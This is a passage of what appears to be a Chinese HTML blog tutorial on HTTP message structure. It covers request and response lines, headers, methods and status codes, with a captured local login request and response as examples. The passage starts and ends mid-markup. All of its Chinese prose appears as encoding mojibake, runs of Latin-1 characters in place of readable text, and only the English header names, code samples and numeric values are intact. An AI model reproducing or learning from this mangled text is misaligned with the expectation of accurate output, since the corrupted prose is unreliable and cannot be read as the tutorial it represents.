¼å¼</h1><p>ç”¨äºHTTPåè®®äº¤äº’çš„ä¿¡æ¯è¢«ç§°ä¸ºæŠ¥æ–‡ã€‚</p><p>è¯·æ±‚ç«¯ï¼ˆå®¢æˆ·ç«¯ï¼‰çš„HTTPæŠ¥æ–‡å«åšè¯·æ±‚æŠ¥æ–‡ï¼Œå“åº”ç«¯ï¼ˆæœåŠ¡å™¨ç«¯ï¼‰çš„å«åšå“åº”æŠ¥æ–‡ã€‚HTTPæŠ¥æ–‡æœ¬èº«æ˜¯ç”±å¤šè¡Œæ•°æ®æ„æˆçš„å­—ç¬¦ä¸²æ–‡æœ¬ã€‚HTTPæŠ¥æ–‡å¤§è‡´ä¸Šå¯åˆ†ä¸ºæŠ¥æ–‡é¦–éƒ¨å’ŒæŠ¥æ–‡ä¸»ä½“ä¸¤å—ï¼Œä¸¤è€…ç”±æœ€åˆå‡ºç°çš„ç©ºè¡Œæ¥åˆ’åˆ†ã€‚<br>é€šå¸¸æ¥è¯´ï¼Œå¹¶ä¸ä¸€å®šè¦æœ‰æŠ¥æ–‡ä¸»ä½“ã€‚</p><p>HTTPæŠ¥æ–‡ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><p>ï¼ˆ1)èµ·å§‹è¡Œï¼š<br>æŠ¥æ–‡çš„ç¬¬ä¸€è¡Œå°±æ˜¯èµ·å§‹è¡Œ,ç”¨äºåŒºåˆ†æ˜¯è¯·æ±‚æŠ¥æ–‡è¿˜æ˜¯å“åº”æŠ¥æ–‡ï¼Œè¯·æ±‚æŠ¥æ–‡ä¸­å¼€å§‹è¡Œå«åšè¯·æ±‚è¡Œï¼Œè€Œå“åº”æŠ¥æ–‡ä¸­ï¼Œå¼€å§‹è¡Œå«åšçŠ¶æ€è¡Œã€‚åœ¨å¼€å§‹è¡Œçš„ä¸‰ä¸ªå­—æ®µä¹‹é—´éƒ½ç”¨ç©ºæ ¼åˆ†å¼€ï¼Œç»“å°¾å¤„ CRLF è¡¨ç¤ºå›è½¦å’Œæ¢è¡Œã€‚</p><p>ï¼ˆ2)é¦–éƒ¨è¡Œï¼š<br>èµ·å§‹è¡Œåé¢æœ‰é›¶ä¸ªæˆ–å¤šä¸ªå­—æ®µã€‚æ¯ä¸ªå­—æ®µéƒ½åŒ…å«ä¸€ä¸ªåå­—å’Œä¸€ä¸ªå€¼,ä¸ºäº†ä¾¿äºè§£æ,ä¸¤è€…ä¹‹é—´ç”¨å†’å·(:)æ¥åˆ†éš”ï¼Œé¦–éƒ¨ä»¥ä¸€ä¸ªç©ºè¡Œç»“æŸã€‚<br>ç”¨äºè¯´æ˜æµè§ˆå™¨ã€æœåŠ¡å™¨æˆ–æŠ¥æ–‡ä¸»ä½“çš„ä¸€äº›ä¿¡æ¯ã€‚åœ¨æ¯ä¸€ä¸ªé¦–éƒ¨è¡Œä¸­éƒ½æœ‰é¦–éƒ¨å­—æ®µåå’Œå®ƒçš„å€¼ï¼Œæ¯ä¸€è¡Œåœ¨ç»“æŸçš„åœ°æ–¹éƒ½è¦æœ‰â€œå›è½¦â€å’Œâ€œæ¢è¡Œâ€ã€‚æ•´ä¸ªé¦–éƒ¨è¡Œç»“æŸæ—¶ï¼Œè¿˜æœ‰ä»¥ç©ºè¡Œå°†é¦–éƒ¨è¡Œå’Œåé¢çš„å®ä½“åˆ†å¼€ã€‚</p><p>ï¼ˆ3)ä¸»ä½“ï¼š<br>ç©ºè¡Œä¹‹åå°±æ˜¯å¯é€‰çš„æŠ¥æ–‡ä¸»ä½“äº†ï¼Œå…¶ä¸­åŒ…å«äº†æ‰€æœ‰ç±»å‹çš„æ•°æ®ã€‚è¯·æ±‚ä¸»ä½“æ˜¯è¦å‘é€ç»™æœåŠ¡å™¨çš„æ•°æ®;å“åº”ä¸»ä½“æ˜¯è¦è¿”å›ç»™å®¢æˆ·ç«¯çš„æ•°æ®ã€‚åœ¨è¯·æ±‚æŠ¥æ–‡ä¸­ä¸€èˆ¬ä¸ç”¨è¿™ä¸ªå­—æ®µï¼Œè€Œåœ¨å“åº”æŠ¥æ–‡ä¸­ä¹Ÿå¯èƒ½æ²¡æœ‰è¿™ä¸ªå­—æ®µã€‚</p><h2 id="Requestè¯·æ±‚æŠ¥æ–‡"><a href="#Requestè¯·æ±‚æŠ¥æ–‡" class="headerlink" title="Requestè¯·æ±‚æŠ¥æ–‡"></a>Requestè¯·æ±‚æŠ¥æ–‡</h2><blockquote><p>  HTTPè¯·æ±‚æŠ¥æ–‡â€”â€”ä»å®¢æˆ·å‘æœåŠ¡å™¨å‘é€è¯·æ±‚æŠ¥æ–‡</p></blockquote><p>  HTTPçš„è¯·æ±‚æŠ¥æ–‡ç”±ä¸‰éƒ¨åˆ†ç»„æˆ : è¯·æ±‚è¡Œ , é¦–éƒ¨è¡Œå’Œå®ä½“ , å¦‚ä¸‹å›¾ :<br><img src="https://img-blog.csdnimg.cn/20210328202511308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>è¯·æ±‚è¡Œï¼šè¯·æ±‚è¡Œç”±è¯·æ±‚æ–¹æ³•å­—æ®µã€URLå­—æ®µå’ŒHTTPåè®®ç‰ˆæœ¬å­—æ®µ3ä¸ªå­—æ®µç»„æˆï¼Œå®ƒä»¬ç”¨ç©ºæ ¼åˆ†éš”ã€‚æ¯”å¦‚ GET /data/info.html HTTP/1.1ã€‚æ–¹æ³•å­—æ®µå°±æ˜¯HTTPä½¿ç”¨çš„è¯·æ±‚æ–¹æ³•ï¼Œæ¯”å¦‚å¸¸è§çš„GET/POST</li><li>è¯·æ±‚å¤´ï¼šæµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™å¿…é¡»æŒ‡æ˜è¯·æ±‚ç±»å‹(ä¸€èˆ¬æ˜¯GETæˆ–è€… POST)ã€‚å¦‚æœ‰å¿…è¦ï¼Œå®¢æˆ·ç¨‹åºè¿˜å¯ä»¥é€‰æ‹©å‘é€å…¶ä»–çš„è¯·æ±‚å¤´ã€‚å¤§å¤šæ•°è¯·æ±‚å¤´å¹¶ä¸æ˜¯å¿…éœ€çš„ï¼Œä½†Content-Lengthé™¤å¤–ã€‚å¯¹äºPOSTè¯·æ±‚æ¥è¯´ Content-Lengthå¿…é¡»å‡ºç°ã€‚</li><li>å®ä½“ï¼šè‹¥æ–¹æ³•å­—æ®µæ˜¯GETï¼Œåˆ™æ­¤é¡¹ä¸ºç©ºï¼Œæ²¡æœ‰æ•°æ®ã€‚è‹¥æ–¹æ³•å­—æ®µæ˜¯POST,åˆ™é€šå¸¸æ¥è¯´æ­¤å¤„æ”¾ç½®çš„å°±æ˜¯è¦æäº¤çš„æ•°æ®</li></ul><h3 id="è¯·æ±‚æŠ¥æ–‡å®ä¾‹"><a href="#è¯·æ±‚æŠ¥æ–‡å®ä¾‹" class="headerlink" title="è¯·æ±‚æŠ¥æ–‡å®ä¾‹"></a>è¯·æ±‚æŠ¥æ–‡å®ä¾‹</h3><p>æŠ“åŒ…æœ¬åœ°æ­å»ºçš„ç™»é™†é¡µé¢ï¼Œå¾—åˆ°è¯·æ±‚å¤´ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /<span class="hljs-built_in">test</span>/login.html HTTP/1.1        <span class="hljs-comment">#è¯·æ±‚æ–¹æ³•ä¸ºPOSTï¼Œè¯·æ±‚URLä¸º/test/login.htmlï¼ŒHTTPåè®®ç‰ˆæœ¬ä¸ºHTTP/1.1</span><br>Host: 127.0.0.1<span class="hljs-comment">#å®¢æˆ·æœºé€šè¿‡è¿™ä¸ªå¤´å‘Šè¯‰æœåŠ¡å™¨ï¼Œæƒ³è®¿é—®çš„ä¸»æœºå</span><br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0  <span class="hljs-comment">#æŒ‡å®šç”¨æˆ·ä»£ç†æœåŠ¡å™¨çš„ç±»å‹ã€‚</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2   <span class="hljs-comment">#æŒ‡å‡ºå®¢æˆ·æµè§ˆå™¨æ”¯æŒçš„è¯­è¨€æ˜¯è‹±è¯­ï¼ˆenglishï¼‰</span><br>Accept-Encoding: gzip, deflate        <span class="hljs-comment">#æŒ‡å‡ºå‘é€æ­¤è¯·æ±‚çš„æµè§ˆå™¨æ”¯æŒå“ªäº›å‹ç¼©ç¼–ç æ–¹å¼ã€‚</span><br>Content-Type: application/x-www-form-urlencoded      <span class="hljs-comment">#è¡¨ç¤ºåé¢çš„æ–‡æ¡£å±äºä»€ä¹ˆMIMEç±»å‹</span><br>Content-Length: 26 <span class="hljs-comment">#è¡¨ç¤ºå†…å®¹é•¿åº¦</span><br>Origin: http://127.0.0.1     <span class="hljs-comment">#Originä¸»è¦æ˜¯ç”¨æ¥è¯´æ˜æœ€åˆè¯·æ±‚æ˜¯ä»å“ªé‡Œå‘èµ·çš„ï¼›</span><br>Connection: close         <span class="hljs-comment">#æ˜¯åœ¨å‘ŠçŸ¥æœåŠ¡å™¨æœ¬æµè§ˆå™¨ä¸æƒ³ä½¿ç”¨æ°¸ä¹…è¿æ¥æ–¹å¼ï¼ˆHTTP/1.0ä½¿ç”¨éæ°¸ä¹…è¿æ¥ï¼ŒHTTP/1.1é»˜è®¤ä½¿ç”¨æ°¸ä¹…è¿æ¥ï¼‰ã€‚</span><br>Referer: http://127.0.0.1/<span class="hljs-built_in">test</span>/index.html   <span class="hljs-comment">#å®¢æˆ·æœºé€šè¿‡è¿™ä¸ªå¤´å‘Šè¯‰æœåŠ¡å™¨ï¼Œå®ƒæ˜¯ä»å“ªä¸ªèµ„æºæ¥è®¿é—®æœåŠ¡å™¨çš„</span><br>Cookie: _ga=GA1.1.1592130974.1616653076; bdshare_firstime=1616653211943       <span class="hljs-comment">#å®¢æˆ·æœºé€šè¿‡è¿™ä¸ªå¤´å¯ä»¥å‘æœåŠ¡å™¨å¸¦æ•°æ®</span><br>Upgrade-Insecure-Requests: 1        <span class="hljs-comment">#è¡¨ç¤ºèƒ½è¯»æ‡‚æœåŠ¡å™¨å‘è¿‡æ¥çš„ä¸Šé¢è¿™æ¡ä¿¡æ¯</span><br><br>username=<span class="hljs-built_in">test</span>&amp;password=123     <span class="hljs-comment">#è¯·æ±‚æ•°æ®</span><br></code></pre></td></tr></table></figure><h3 id="è¯·æ±‚æ–¹æ³•"><a href="#è¯·æ±‚æ–¹æ³•" class="headerlink" title="è¯·æ±‚æ–¹æ³•"></a>è¯·æ±‚æ–¹æ³•</h3><p>æ–¹æ³•å­—æ®µæŒ‡å‡ºå®¢æˆ·è¯·æ±‚æœåŠ¡å™¨æ‰§è¡Œçš„ä¸€èˆ¬æ“ä½œã€‚HTTP/1.1ä¸­å®šä¹‰äº†å…«ç§è¯·æ±‚æ–¹æ³•ï¼Œå…¶ä¸­GETã€POSTã€HEADã€æ˜¯å¸¸ç”¨è¯·æ±‚æ–¹æ³•ã€‚</p><table><thead><tr><th>æ–¹æ³•</th><th>æè¿°</th></tr></thead><tbody><tr><td>GET</td><td>è·å–ä¸€ä¸ªURLæŒ‡å®šçš„èµ„æº,å³èµ„æºå®ä½“ã€‚</td></tr><tr><td>POST</td><td>ä¼ è¾“å®ä½“ä¸»ä½“,å‘æœåŠ¡å™¨æäº¤æ•°æ®ã€‚</td></tr><tr><td>HEAD</td><td>è·å–ä¸€ä¸ªæŒ‡å®šèµ„æºçš„ä¿¡æ¯,ç±»ä¼¼GETæ–¹æ³•ï¼ŒåŒºåˆ«åœ¨äºåªè¿”å›æŠ¥æ–‡é¦–éƒ¨ï¼Œä¸è¿”å›æŠ¥æ–‡ä¸»ä½“ã€‚</td></tr><tr><td>PUT</td><td>å‘æœåŠ¡å™¨æäº¤èµ„æº,ç”¨æ¥ä¼ è¾“æ–‡ä»¶ã€‚</td></tr><tr><td>DELETE</td><td>è¯·æ±‚æºæœåŠ¡å™¨åˆ é™¤Request-URIæ ‡è¯†çš„èµ„æº,ç”¨æ¥åˆ é™¤æ–‡ä»¶ã€‚</td></tr><tr><td>TRACE</td><td>ç½‘ç»œè·Ÿè¸ª</td></tr><tr><td>CONNECT</td><td>ä¸PROXYä¹‹é—´çš„è¿æ¥ç®¡ç†,è¦æ±‚ç”¨éš§é“åè®®è¿æ¥ä»£ç†ã€‚</td></tr><tr><td>OPTIONS</td><td>æŸ¥è¯¢èƒ½åŠ›,è¯¢é—®æ”¯æŒæ–¹æ³•è¿”å›æœåŠ¡å™¨æ”¯æŒçš„æ–¹æ³•ã€‚</td></tr></tbody></table><p><strong>GETå’ŒPOSTä¹‹é—´çš„åŒºåˆ«</strong></p><p>1ã€GETæ–¹æ³•çš„æ•°æ®å‚æ•°æ˜¯æš´éœ²åœ¨èµ·å§‹è¡Œçš„URLä¸­çš„ï¼Œè€ŒPOSTæ–¹æ³•çš„æ•°æ®å‚æ•°æ˜¯åœ¨æŠ¥æ–‡ä¸»ä½“ä¸­çš„ã€‚<br>2ã€GETæ–¹æ³•ç›¸å¯¹æ¥è¯´æ²¡æœ‰POSTå®‰å…¨ï¼Œå› ä¸ºå®ƒçš„æ•°æ®å‚æ•°å¯ä»¥ç›´æ¥ä»URLä¸­è·å–ï¼Œä½†æ˜¯GETçš„æ•ˆç‡æ›´é«˜ã€‚<br>3ã€GETæ–¹æ³•çš„æ•°æ®å‚æ•°å¤§å°æœ‰ä¸€å®šçš„é™åˆ¶ï¼ˆ1024ï¼‰ï¼ˆåŸå› ä¹Ÿæ˜¯å› ä¸ºå®ƒçš„æ•°æ®å‚æ•°æ˜¯æ”¾åœ¨URLä¸­çš„ï¼‰ï¼Œè€ŒPOSTå¯¹æ•°æ®å¤§å°æ˜¯æ²¡æœ‰é™åˆ¶çš„ã€‚<br>å…¶å®ä»–ä»¬çš„æœ¬è´¨åŒºåˆ«æ˜¯GETæ˜¯ä»æœåŠ¡å™¨ä¸Šè¯·æ±‚æ•°æ®ï¼Œè€ŒPOSTæ˜¯å‘æœåŠ¡å™¨å‘é€æ•°æ®</p><h3 id="è¯·æ±‚æŠ¥æ–‡å±æ€§"><a href="#è¯·æ±‚æŠ¥æ–‡å±æ€§" class="headerlink" title="è¯·æ±‚æŠ¥æ–‡å±æ€§"></a>è¯·æ±‚æŠ¥æ–‡å±æ€§</h3><p>è¯·æ±‚å¤´éƒ¨ä¸ºè¯·æ±‚æŠ¥æ–‡æ·»åŠ äº†ä¸€äº›é™„åŠ ä¿¡æ¯ï¼Œç”±â€œå/å€¼â€å¯¹ç»„æˆï¼Œæ¯è¡Œä¸€å¯¹ï¼Œåå’Œå€¼ä¹‹é—´ä½¿ç”¨å†’å·åˆ†éš”</p><p>å¸¸è§è¯·æ±‚å¤´å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">Client-IPï¼šæä¾›äº†è¿è¡Œå®¢æˆ·ç«¯çš„æœºå™¨çš„IPåœ°å€<br><br>Fromï¼šæä¾›äº†å®¢æˆ·ç«¯ç”¨æˆ·çš„E-mailåœ°å€<br><br>Hostï¼šç»™å‡ºäº†æ¥æ”¶è¯·æ±‚çš„æœåŠ¡å™¨çš„ä¸»æœºåå’Œç«¯å£å·<br><br>Refererï¼šæä¾›äº†åŒ…å«å½“å‰è¯·æ±‚URIçš„æ–‡æ¡£çš„URLï¼ŒæœåŠ¡å™¨èƒ½çŸ¥é“ä½ æ˜¯ä»å“ªä¸ªé¡µé¢è¿‡æ¥çš„<br><br>UA-Colorï¼šæä¾›äº†ä¸å®¢æˆ·ç«¯æ˜¾ç¤ºå™¨çš„æ˜¾ç¤ºé¢œè‰²æœ‰å…³çš„ä¿¡æ¯<br><br>UA-CPUï¼šç»™å‡ºäº†å®¢æˆ·ç«¯CPUçš„ç±»å‹æˆ–åˆ¶é€ å•†<br><br>UA-OSï¼šç»™å‡ºäº†è¿è¡Œåœ¨å®¢æˆ·ç«¯æœºå™¨ä¸Šçš„æ“ä½œç³»ç»Ÿåç§°åŠç‰ˆæœ¬<br><br>User-Agentï¼šå°†å‘èµ·è¯·æ±‚çš„åº”ç”¨ç¨‹åºåç§°å‘ŠçŸ¥æœåŠ¡å™¨ <br>      <br>Acceptï¼šå‘Šè¯‰æœåŠ¡å™¨èƒ½å¤Ÿå‘é€å“ªäº›åª’ä½“ç±»å‹<br><br>Accept-Charsetï¼šå‘Šè¯‰æœåŠ¡å™¨èƒ½å¤Ÿå‘é€å“ªäº›å­—ç¬¦é›†<br><br>Accept-Encodingï¼šå‘Šè¯‰æœåŠ¡å™¨èƒ½å¤Ÿå‘é€å“ªäº›ç¼–ç æ–¹å¼<br><br>Accept-Languageï¼šå‘Šè¯‰æœåŠ¡å™¨èƒ½å¤Ÿå‘é€å“ªäº›è¯­è¨€<br><br>TEï¼šå‘Šè¯‰æœåŠ¡å™¨å¯ä»¥ä½¿ç”¨é‚£äº›æ‰©å±•ä¼ è¾“ç¼–ç <br><br>Expectï¼šå…è®¸å®¢æˆ·ç«¯åˆ—å‡ºæŸè¯·æ±‚æ‰€è¦æ±‚çš„æœåŠ¡å™¨è¡Œä¸º<br><br>Rangeï¼šå¦‚æœæœåŠ¡å™¨æ”¯æŒèŒƒå›´è¯·æ±‚ï¼Œå°±è¯·æ±‚èµ„æºçš„æŒ‡å®šèŒƒå›´<br><br>Cookieï¼šå®¢æˆ·ç«¯ç”¨å®ƒå‘æœåŠ¡å™¨ä¼ é€æ•°æ®<br><br>Cookie2ï¼šç”¨æ¥è¯´æ˜è¯·æ±‚ç«¯æ”¯æŒçš„cookieç‰ˆæœ¬<br><br>Upgrade-Insecure-Requestsï¼šè¡¨ç¤ºèƒ½è¯»æ‡‚æœåŠ¡å™¨å‘è¿‡æ¥çš„ä¸Šé¢è¿™æ¡ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨ä»¥åå‘è¯·æ±‚çš„æ—¶å€™ä¸ç”¨httpè€Œç”¨https<br></code></pre></td></tr></table></figure><h2 id="Responseå“åº”æŠ¥æ–‡"><a href="#Responseå“åº”æŠ¥æ–‡" class="headerlink" title="Responseå“åº”æŠ¥æ–‡"></a>Responseå“åº”æŠ¥æ–‡</h2><blockquote><p>  HTTPå“åº”æŠ¥æ–‡â€”â€”ä»æœåŠ¡å™¨åˆ°å®¢æˆ·çš„å›ç­”</p></blockquote><p>   HTTPçš„è¯·æ±‚æŠ¥æ–‡ç”±ä¸‰éƒ¨åˆ†ç»„æˆ : çŠ¶æ€è¡Œ ã€ é¦–éƒ¨è¡Œå’Œå®ä½“ , å¦‚ä¸‹å›¾ :<br><img src="https://img-blog.csdnimg.cn/20210328202534215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>å“åº”è¡Œï¼šå“åº”è¡Œä¸€èˆ¬ç”±åè®®ç‰ˆæœ¬ã€çŠ¶æ€ç åŠå…¶æè¿°ç»„æˆ æ¯”å¦‚ HTTP/1.1 200 OKã€‚å…¶ä¸­åè®®ç‰ˆæœ¬HTTP/1.1æˆ–è€…HTTP/1.0ï¼Œ200å°±æ˜¯å®ƒçš„çŠ¶æ€ç ï¼ŒOKåˆ™ä¸ºå®ƒçš„æè¿°ã€‚</li><li>å“åº”å¤´ï¼šå“åº”å¤´ç”¨äºæè¿°æœåŠ¡å™¨çš„åŸºæœ¬ä¿¡æ¯ï¼Œä»¥åŠæ•°æ®çš„æè¿°ï¼ŒæœåŠ¡å™¨é€šè¿‡è¿™äº›æ•°æ®çš„æè¿°ä¿¡æ¯ï¼Œå¯ä»¥é€šçŸ¥å®¢æˆ·ç«¯å¦‚ä½•å¤„ç†ç­‰ä¸€ä¼šå„¿å®ƒå›é€çš„æ•°æ®ã€‚</li><li>å“åº”ä½“ï¼šå“åº”ä½“å°±æ˜¯å“åº”çš„æ¶ˆæ¯ä½“ï¼Œå¦‚æœæ˜¯çº¯æ•°æ®å°±æ˜¯è¿”å›çº¯æ•°æ®ï¼Œå¦‚æœè¯·æ±‚çš„æ˜¯HTMLé¡µé¢ï¼Œé‚£ä¹ˆè¿”å›çš„å°±æ˜¯HTMLä»£ç ï¼Œå¦‚æœæ˜¯JSå°±æ˜¯JSä»£ç ï¼Œå¦‚æ­¤ä¹‹ç±»ã€‚<h3 id="å“åº”æŠ¥æ–‡å®ä¾‹"><a href="#å“åº”æŠ¥æ–‡å®ä¾‹" class="headerlink" title="å“åº”æŠ¥æ–‡å®ä¾‹"></a>å“åº”æŠ¥æ–‡å®ä¾‹</h3>æŠ“åŒ…æœ¬åœ°æ­å»ºçš„ç™»é™†é¡µé¢ï¼Œå¾—åˆ°å“åº”å¤´ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">HTTP/1.1 200 OK   <span class="hljs-comment">#HTTPåè®®åŠç‰ˆæœ¬ çŠ¶æ€ç </span><br>Date: Mon, 29 Mar 2021 02:57:52 GMT  <span class="hljs-comment">#æœåŠ¡å™¨åˆ›å»ºå¹¶å‘é€æœ¬å“åº”æ¶ˆæ¯çš„æ—¥æœŸå’Œæ—¶é—´ã€‚</span><br>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45  <span class="hljs-comment">#æœåŠ¡å™¨å’Œç‰ˆæœ¬å·</span><br>Last-Modified: Mon, 29 Mar 2021 02:57:07 GMT  <span class="hljs-comment">#å¯¹è±¡æœ¬èº«çš„åˆ›å»ºæˆ–æœ€åä¿®æ”¹æ—¥æœŸæˆ–æ—¶é—´</span><br>ETag: <span class="hljs-string">&quot;8e-5bea4098d63cb&quot;</span>   <span class="hljs-comment">#ç¼“å­˜ç›¸å…³çš„å¤´</span><br>Accept-Ranges: bytes  <span class="hljs-comment">#æ ‡è¯†è‡ªèº«æ”¯æŒèŒƒå›´è¯·æ±‚(partial requests)</span><br>Content-Length: 142  <span class="hljs-comment">#æ‰€å‘é€å¯¹è±¡çš„å­—èŠ‚æ•°</span><br>Connection: close    <span class="hljs-comment">#å¤„ç†å®Œè¿™æ¬¡è¯·æ±‚åæ˜¯å¦æ–­å¼€è¿æ¥è¿˜æ˜¯ç»§ç»­ä¿æŒè¿æ¥</span><br>Content-Type: text/html  <span class="hljs-comment">#åŒ…å«åœ¨å®ä½“ä¸­çš„å¯¹è±¡æ˜¯HTMLæ–‡æœ¬</span><br><br>&lt;!DOCTYPE html&gt;    <span class="hljs-comment">#å®ä½“éƒ¨åˆ†</span><br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;title&gt;succsss&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>Login succsss!!!<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="å“åº”çŠ¶æ€ç "><a href="#å“åº”çŠ¶æ€ç " class="headerlink" title="å“åº”çŠ¶æ€ç "></a>å“åº”çŠ¶æ€ç </h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">HTTP å“åº”ä»£ç </a>ï¼ŒçŠ¶æ€ä»£ç ç”±æœåŠ¡å™¨å‘å‡ºï¼Œä»¥å“åº”å®¢æˆ·ç«¯å¯¹æœåŠ¡å™¨çš„è¯·æ±‚ã€‚</p><p>è¯·æ±‚æŠ¥æ–‡çš„æ–¹æ³•å­—æ®µæ˜¯å¯¹æ‰€è¯·æ±‚å¯¹è±¡è¿›è¡Œçš„æ“ä½œï¼Œè€Œå“åº”æŠ¥æ–‡çš„çŠ¶æ€ç æ˜¯ä¸€ä¸ª 3 ä½æ•°å­—ï¼Œå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ 5 ç±» ï¼š</p><table><thead><tr><th>çŠ¶æ€ç ç±»åˆ«</th><th>æè¿°</th></tr></thead><tbody><tr><td>1xx</td><td>æ”¶åˆ°è¯·æ±‚ï¼Œç»§ç»­å¤„ç†ã€‚</td></tr><tr><td>2xx</td><td>è¯·æ±‚å·²æˆåŠŸæ¥æ”¶ï¼Œç†è§£å’Œæ¥å—</td></tr><tr><td>3xx</td><td>é‡å®šå‘åˆ°å…¶å®ƒåœ°æ–¹</td></tr><tr><td>4xx</td><td>å®¢æˆ·çš„å·®é”™ï¼Œè¯·æ±‚åŒ…å«é”™è¯¯çš„è¯­æ³•æˆ–æ— æ³•æ»¡è¶³ã€‚</td></tr><tr><td>5xx</td><td>æœåŠ¡å™¨çš„å·®é”™ï¼ŒæœåŠ¡å™¨æ— æ³•æ»¡è¶³æ˜æ˜¾æœ‰æ•ˆçš„è¯·æ±‚</td></tr></tbody></table><p>å¸¸è§çš„çŠ¶æ€ç ï¼š</p><table><thead><tr><th>çŠ¶æ€ç </th><th>æè¿°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>200</td><td>OK</td><td>è¡¨ç¤ºä»å®¢æˆ·ç«¯å‘é€ç»™æœåŠ¡å™¨çš„è¯·æ±‚è¢«æ­£å¸¸å¤„ç†å¹¶è¿”å›</td></tr><tr><td>204</td><td>No Content</td><td>è¡¨ç¤ºå®¢æˆ·ç«¯å‘é€ç»™å®¢æˆ·ç«¯çš„è¯·æ±‚å¾—åˆ°äº†æˆåŠŸå¤„ç†ï¼Œä½†åœ¨è¿”å›çš„å“åº”æŠ¥æ–‡ä¸­ä¸å«å®ä½“çš„ä¸»ä½“éƒ¨åˆ†</td></tr><tr><td>301</td><td>Moved Permanently</td><td>æ°¸ä¹…é‡å®šå‘ï¼Œè¡¨ç¤ºè¯·æ±‚çš„èµ„æºè¢«åˆ†é…äº†æ–°çš„URLï¼Œä¹‹ååº”ä½¿ç”¨æ›´æ”¹çš„URLã€‚</td></tr><tr><td>302</td><td>Found</td><td>ä¸´æ—¶é‡å®šå‘ï¼Œè¡¨ç¤ºè¯·æ±‚çš„èµ„æºè¢«åˆ†é…äº†æ–°çš„URLï¼Œå¸Œæœ›æœ¬æ¬¡è®¿é—®ä½¿ç”¨æ–°çš„URLã€‚</td></tr><tr><td>304</td><td>Not Modified</td><td>ç¼“å­˜æ–‡ä»¶å¹¶æœªè¿‡æœŸï¼Œè¿˜å¯ç»§ç»­ä½¿ç”¨ï¼Œæ— éœ€å†æ¬¡ä»æœåŠ¡ç«¯è·å–</td></tr><tr><td>400</td><td>Bad Request</td><td>å®¢æˆ·ç«¯è¯·æ±‚æœ‰è¯­æ³•é”™è¯¯ï¼Œä¸èƒ½è¢«æœåŠ¡å™¨è¯†åˆ«</td></tr><tr><td>401</td><td>Unauthorized</td><td>æœªç»è®¸å¯ï¼Œéœ€è¦é€šè¿‡HTTPè®¤è¯</td></tr><tr><td>403</td><td>Forbidden</td><td>æœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œä½†æ˜¯æ‹’ç»æä¾›æœåŠ¡ã€‚</td></tr><tr><td>404</td><td>Not Found</td><td>è¯·æ±‚èµ„æºä¸å­˜åœ¨</td></tr><tr><td>500</td><td>Internal Server Error</td><td>æœåŠ¡å™¨å†…éƒ¨é”™è¯¯</td></tr><tr><td>503</td><td>Server Unavailable</td><td>æœåŠ¡å™¨æš‚æ—¶ä¸èƒ½å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚</td></tr></tbody></table><h3 id="å“åº”æŠ¥æ–‡å±æ€§"><a href="#å“åº”æŠ¥æ–‡å±æ€§" class="headerlink" 